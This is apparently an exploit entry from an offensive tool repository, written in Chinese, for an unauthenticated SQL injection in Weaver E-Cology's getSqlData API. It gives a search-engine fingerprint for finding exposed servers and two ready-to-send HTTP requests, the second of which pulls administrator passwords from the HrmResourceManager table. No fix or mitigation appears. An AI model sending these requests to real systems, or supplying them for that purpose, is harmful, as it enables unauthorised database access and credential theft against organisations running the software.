---
source: "LittleBear4/OA-EXPTOOL"
---

# 泛微E-Cology getSqlData接口SQL注入漏洞

## 漏洞描述

泛微 E-Cology 的 `/Api/portal/elementEcodeAddon/getSqlData` 接口中 `sql` 参数存在SQL注入漏洞。该接口未做登录校验，攻击者无需登录即可通过 `sql` 参数执行任意 SQL 查询，直接读取数据库敏感信息。

## 漏洞影响

```
泛微 E-Cology
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

```
GET /Api/portal/elementEcodeAddon/getSqlData?sql=select%20user%20 HTTP/1.1
```

响应中将直接返回 SQL 查询结果。可替换 SQL 语句读取任意数据，例如：

```
GET /Api/portal/elementEcodeAddon/getSqlData?sql=select%20password%20from%20HrmResourceManager HTTP/1.1
```
